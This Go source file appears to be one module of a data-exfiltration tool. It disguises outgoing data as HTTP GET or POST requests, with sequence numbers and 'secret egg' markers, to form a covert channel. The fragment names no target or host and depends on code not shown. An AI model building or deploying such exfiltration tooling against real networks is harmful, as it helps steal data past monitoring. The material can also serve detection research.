package main

var (
	currentOffSetVal = "0001"
)

// Entry Point for HTTP module
func SendHTTPExfil(packet Packet, data []byte, eof bool, seqNum string, frwd bool) {

	// TODO _ FIX THIS AS ITS BASIC
	// Build HTTP Header
	header := BuildHTTPHeader(true)

	if frwd {
		// Strip anything out of data from a previous request
		data = ParseHTTPData(data, true)
	}

	// set final payload
	finalPayload := []byte(header)
	finalPayload = append(finalPayload, data...)

	packet.UpdateSeqNum(seqToByte(seqNum))

	packet.addData(finalPayload)
	packet.CompilePacket()

	// check EOF
	if eof {
		packet.send(true)
	} else {
		packet.send(false)
	}

}

// Build the HTTP Header
func BuildHTTPHeader(getReq bool) string {
	header := ""

	if getReq {
		for opt, val := range GetRequest {
			if opt == "GET" {
				header = opt + " " + val + header
			} else if opt == "" {
				header = opt + ": " + val
			} else {
				header = header + "\n" + opt + ": " + val
			}
		}
	} else {
		for opt, val := range PostRequest {
			if opt == "POST" {
				header = opt + " " + val + header
			} else if opt == "" {
				header = opt + ": " + val
			} else {
				header = header + "\n" + opt + ": " + val
			}
		}
	}
	return fixUTF(header)
}

// Parse the Raw HTTP Data
func ParseHTTPData(data []byte, getReq bool) []byte {

	newData := stripSecretEgg(data)
	lenToData := len([]byte(BuildHTTPHeader(getReq)))

	newData = newData[lenToData:] // Strips HTTP Header

	// Check to see if there is an EOF present if so strip that out
	if checkEOF(data) {
		newData = stripSecretEggEOF(newData)
	}
	return newData
}
